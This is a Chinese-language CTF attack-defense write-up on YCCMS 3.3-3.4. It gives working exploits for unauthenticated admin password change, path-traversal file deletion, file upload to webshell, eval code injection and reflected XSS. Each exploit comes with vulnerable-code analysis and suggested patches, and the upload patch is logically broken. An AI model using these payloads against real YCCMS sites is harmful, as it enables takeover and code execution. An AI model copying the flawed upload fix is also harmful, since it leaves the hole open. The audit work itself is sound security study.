# bugkuAWD-19-YCCMS

版本范围: 3.3-3.4

## 越权修改管理员密码

EXP

```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->

<body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://192-168-1-193.pvp336.bugku.cn/admin/?a=admin&m=update" method="POST">
        <input type="hidden" name="username" value="admin" />
        <input type="hidden" name="password" value="admin123" />
        <input type="hidden" name="notpassword" value="admin123" />
        <input type="hidden" name="send" value="ä&#191;&#174;æ&#148;&#185;å&#175;&#134;ç&#160;&#129;" />
        <input type="submit" value="Submit request" />
    </form>
</body>

</html>
```

在未登录的情况下构造url,只需要更改username, password, notpassword的值即可更改数据库中admin账号的相关信息 

![20210618190644835](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210618190644835.png)

 函数位于 `controller\AdminAction.class.php` 中的update函数

```php
public function update(){
        if(isset($_POST['send'])){
            if(validate::isNullString($_POST['username'])) Tool::t_back('用户名不能为空','?a=admin&m=update');
            if(validate::isNullString($_POST['password'])) Tool::t_back('密码不能为空!','?a=admin&m=update');
            if(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('两次密码不一致!','?a=admin&m=update');
            $this->_model->username=$_POST['username'];
            $this->_model->password=sha1($_POST['password']);
            $_edit=$this->_model->editAdmin();
            if($_edit){
                tool::layer_alert('密码修改成功!','?a=admin&m=update',6);
                }else{
                tool::layer_alert('密码未修改!','?a=admin&m=update',6);
            }
        }

            $this->_tpl->assign('admin', $_SESSION['admin']);
            $this->_tpl->display('admin/public/update.tpl');
    }
```

重点关注下editAdmin()函数，该函数位于 `model\AdminModel.class.php`

```php
public function editAdmin(){
        $_sql="UPDATE
                    my_admin
                SET
                    username='$this->username',
                    password='$this->password'
                WHERE
                    id=1
                LIMIT 1";
        return parent::update($_sql);
    }
```

该函数的父类为Model, 位于 `model\Model.class.php`，看一下update函数 

```php
protected function update($_sql){
        return $this->execute($_sql)->rowCount();
    }
```

调用execute函数去执行sql语句

```php
protected function execute($_sql){
        try{
            $_stmt=$this->_db->prepare($_sql);
            $_stmt->execute();
        }catch (PDOException $e){
            exit('SQL语句:'.$_sql.'<br />错误信息:'.$e->getMessage());
        }
        return $_stmt;
    }
}
```

这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码

### 修改

加上 session 判断即可

```
if (isset($_SESSION['admin'])) {}
else {Tool::alertLocation(null, '?a=login');}
```

## 任意文件删除

同样是越权操作

```
POST /config/count.php?a=pic&m=delall HTTP/1.1
Host: 192-168-1-193.pvp336.bugku.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://192-168-1-193.pvp336.bugku.cn
Connection: close
Referer: http://192-168-1-193.pvp336.bugku.cn/config/count.php?a=pic
Cookie: PHPSESSID=tv9fnmn7bbj5n489c5ha5cfs67
Upgrade-Insecure-Requests: 1

pid%5B0%5D=../index.html&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87
```

只需要更改 `pid%5B0%5D` 的值即可任意删除文件, 当前目录是 /admin/

![20210618192123307](D:\safetool\Tools\Web2\github\Rickyweb\bugkuAWD\img\20210618192123307.png)

其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生
根据url定位到相关函数位置,位于 `/controller/PicAction.class.php`

```php
public function delall(){
        if(isset($_POST['send'])){
            if(validate::isNullString($_POST['pid'])) tool::layer_alert('没有选择任何图片!','?a=pic',7);
            $_fileDir=ROOT_PATH.'/uploads/';
            foreach($_POST['pid'] as $_value){
                $_filePath=$_fileDir.$_value;
                if(!unlink($_filePath)){
                    tool::layer_alert('图片删除失败,请设权限为777!','?a=pic',7);
                }else{
                    header('Location:?a=pic');
                }
            }

        }

    }
```

对 pid 传进来的值并没有进行过滤就进行了了路径的拼接，导致了路径穿越漏洞，触发任意文件删除漏洞
### 修改

加上 session 判断并加上路径过滤(添加白名单)

```
if (isset($_SESSION['admin'])) {}
else {Tool::alertLocation(null, '?a=login');}
if (preg_match('/png$|jpg$|gif$|jpeg$/', $_value)) {} else {header('Location:?a=pic');}
```

## 任意文件上传一

越权上传

```html
<!DOCTYPE html>
<html>
	<head>
		<title>upload</title>
	</head>
<body>
	<form action="http://192-168-1-21.pvp336.bugku.cn/admin/?a=call&m=upLoad" method="POST" enctype="multipart/form-data">
		<!--<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" />-->
		<label for="file">file name: </label>
		<input type="file" name="file"/><br>
		<input type="submit" name="submit" value="Submit"/>
	</form>
</body>
</html>
```

定位到漏洞位置： `controller\CallAction.class.php` 

```php
public function upLoad() {
        if (isset($_POST['send'])) {
            $_logoupload = new LogoUpload('pic',$_POST['MAX_FILE_SIZE']);
            $_path = $_logoupload->getPath();
            $_img = new Image($_path);
            $_img->xhImg(960,0);
            $_img->out();
            //echo $_path;
            $_logoupload->alertOpenerClose('图片上传成功！','..'.$_path);
        } else {
            exit('警告：文件过大或者其他未知错误导致浏览器崩溃！');
        }
    }
```

然后跟进到类LogoUpload ,位于public\class\LogoUpload.class.php，上传首要关注上传是是否允许上传非图片格式的文件

```
private function checkType() {
        if (!in_array($this->type,$this->typeArr)) {
            Tool::alertBack('警告：LOGO图片必须是PNG格式！');
        }
    }

private $typeArr = array('image/png','image/x-png');//类型合集
```

根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了, 然后带上 GIF89a 开头, 上传后会有如下提示

```
<script type='text/javascript'>alert('警告：此图片类型本系统不支持！');history.back();</script>
```

其实已经上传了

```
admin/../view/index/images/logo.php
```

访问即可getshell

## 任意文件上传二

越权上传

```html
<!DOCTYPE html>
<html>
	<head>
		<title>upload</title>
	</head>
<body>
	<form action="http://192-168-1-21.pvp336.bugku.cn/admin/?a=call&m=xhUp&type=xh" method="POST" enctype="multipart/form-data">
		<!--<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" />-->
		<label for="file">file name: </label>
		<input type="file" name="file"/><br>
		<input type="submit" name="submit" value="Submit"/>
	</form>
</body>
</html>
```

在不需要登录的情况下可以看到已经上传成功，上传地址为

```
/uploads/xxx.php
```

定位漏洞位置为 `controller\CallAction.class.php` 中的 xhUp 函数

```php
public function xhUp() {
        if (isset($_GET['type'])) {
            $_fileupload = new FileUpload('filedata',10);
            $_err=$_fileupload->checkError();
            $_path = $_fileupload->getPath();
            $_msg="'..$_path'";
            $_img = new Image($_path);
            $_img->xhImg(650,0);
            $_img->out();
            echo "{'err':'".$_err."','msg':".$_msg."}";
            exit();
        } else {
        Tool::alertBack('警告：由于非法操作导致上传失败！');
        }
    }
```

跟进到类FileUpload， 位于public\class\FileUpload.class.php，然后看到同样也是检查的传入的Content-Type的值 

```php
private function checkType() {
        if (!in_array($this->type,$this->typeArr)) {
            Tool::alertBack('警告：不合法的上传类型！');
        }
    }

private $typeArr = 
array('image/jpeg','image/pjpeg','image/png','image/x-png','image/gif');
```

### 统一修改

加上 session 判断并加上白名单

```
if (isset($_SESSION['admin'])) {}
else {Tool::alertLocation(null, '?a=login');}

private $typeallow = array('png', 'gif', 'jpg', 'jpeg');  //白名单
//验证类型
private function checkType() {
	if (!in_array($this->type,$this->typeArr,$this->typeallow)) {
           if (preg_match('/png$|jpg$|gif$|jpeg$/', $this->type)) {
		Tool::alertBack('警告：不合法的上传类型！');
		}
	}
}
```

## 任意代码执行

主要是在 `/config/run.inc.php`

```php
<?php
require str_replace('\\','/',substr(dirname(__FILE__),0,-6)).'/config/run.inc.php';
?>

其中页面就一行代码，代码主要作用包含 /config/run.inc.php文件 2．在config目录打开run.inc.php文件 
<?php
//开启session
session_start();
//超时时间
@set_time_limit(0);
//设置编码
header('Content-Type:text/html;charset=utf-8');
//错误级别，报告警告之外的所有错误
error_reporting(E_ALL ^ E_NOTICE);
//设置时区
date_default_timezone_set('PRC'); 
//网站绝对根路径
define('ROOT_PATH',str_replace('\\','/',substr(dirname(__FILE__),0,-7))); 
//引入配置文件
require ROOT_PATH.'/config/config.inc.php';
//引入Smarty
require ROOT_PATH.'/public/smarty/Smarty.class.php';
//自动加载类
function __autoload($_className){
	if(substr($_className,-6)=='Action'){
		require ROOT_PATH.'/controller/'.$_className.'.class.php';	
	}elseif(substr($_className, -5) == 'Model'){
		require ROOT_PATH.'/model/'.$_className.'.class.php';
	}else{
		require ROOT_PATH.'/public/class/'.$_className.'.class.php';
	}
}
//单入口
Factory::setAction()->run();
?>
```

跟进 ` /public/class/Factory.class.php `

```php
<?php
class Factory{
	static private $_obj=null;
	static public function setAction(){
		$_a=self::getA();
		if (in_array($_a, array('admin', 'nav', 'article','backup','html','link','pic','search','system','xml','online'))) {
			if (!isset($_SESSION['admin'])) {
				header('Location:'.'?a=login');
			}
		}
		if (!file_exists(ROOT_PATH.'/controller/'.$_a.'Action.class.php')) $_a = 'Index';
		eval('self::$_obj = new '.ucfirst($_a).'Action();');
		return self::$_obj;
	}
	
	static public function setModel() {
		$_a = self::getA();
		if (file_exists(ROOT_PATH.'/model/'.$_a.'Model.class.php')) eval('self::$_obj = new '.ucfirst($_a).'Model();');
		return self::$_obj;
	}
	static public function getA(){
		if(isset($_GET['a']) && !empty($_GET['a'])){
			return $_GET['a'];
		}
		return 'login';
	}
}
?>
```

拼接

```
eval('self::$_obj = new '.ucfirst($_a).'Action();');
Factory();phpinfo();//../
```

其中setAction()方法首先调用getA()方法获取GET传输的过来得a参数并赋值给a，紧接着利用in_array()函数进行检查，其中如果`$_a`变量包含数组中的变量，页面将会跳转。 然后file_exists()函数进行检查页面文件是否存在，如果不存在则将$_a赋值成Index，最后调用eval（）执行PHP代码。如果能够让eval成功执行代码，必须成功逃逸file_exists函数。
file_exists函数主要作用是检查文件是否存在，但是这个函数在进行检查会有一个bug，如/controller/admin;/…/，函数允许路径中有一些特殊字符，并且遇到/…/会返回到上级目录，可以利用这个策略逃逸出file_exists（）函数检查，最后一个利用点eval可以执行多条语句，如：eval(echo 1;echo 2;);可以成功执行两条语句。 

```
config/count.php?a=Factory();phpinfo();//../
admin/index.php?a=Factory();phpinfo();//../
```

### 修改

添加路径白名单(只允许字母通过)

```
if (preg_match('/^[a-z]{1,}$/i', ucfirst($_a))) {
    if (!file_exists(ROOT_PATH . '/controller/' . ucfirst($_a) . 'Action.class.php')) $_a = 'Login';
    eval('self::$_obj = new ' . ucfirst($_a) . 'Action();');
    return self::$_obj;
} else {
    die('hacker!');
}
```

## 后台反射XSS

当然该cms还存在登录处验证码重放漏洞 反射型XSS漏洞 

```
XSS payload
http:xxx.xxx/admin/?a=html&art=<sCrIpT>alert(1)<%2FsCrIpT>&m=arts
```

在 ` /compile/%%D8^D83^D83C04B9%%createhtml.tpl.php `

```
<?php if ($_GET['art']): ?>
<dd><span class="state">内容生成完毕 !共 <?php echo $_GET['art']; ?>
 条。</span></dd>
<?php endif; ?>
```

危害性不大, 可以不修

## 参考

[YCCMS 任意文件上传](https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/)

[YCCMS 代码审计](https://xz.aliyun.com/t/7748)